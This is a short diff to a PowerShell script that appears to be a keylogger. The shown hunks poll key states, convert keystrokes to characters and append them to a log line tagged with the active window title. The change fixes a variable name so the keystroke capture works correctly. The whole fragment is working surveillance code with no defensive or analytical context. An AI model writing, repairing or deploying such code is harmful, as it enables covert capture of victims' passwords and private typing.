@@ -63,7 +63,7 @@ try {
                 $BackSpaceKey = $getKeyState::GetAsyncKeyState(8)
                 $caps_lock = [console]::CapsLock
                 
-                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)
+                $scancode = $getKey::MapVirtualKey($key, $MAPVK_VSC_TO_VK_EX)
                 $kbstate = New-Object Byte[] 256
                 $checkkbstate = $getKBState::GetKeyboardState($kbstate)
 				
@@ -73,7 +73,7 @@ try {
                 $LogOutput = "`"" + $WindowTitle + "`"`t`t`t"
                 
                 $charstring = New-Object -TypeName "System.Text.StringBuilder";
-                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $charstring, $charstring.Capacity, 0)
+                $unicode_res = $getUnicode::ToUnicode($key, $scancode, $kbstate, $charstring, $charstring.Capacity, 0)
                 
                 $LogOutput += $charstring.ToString();
                               
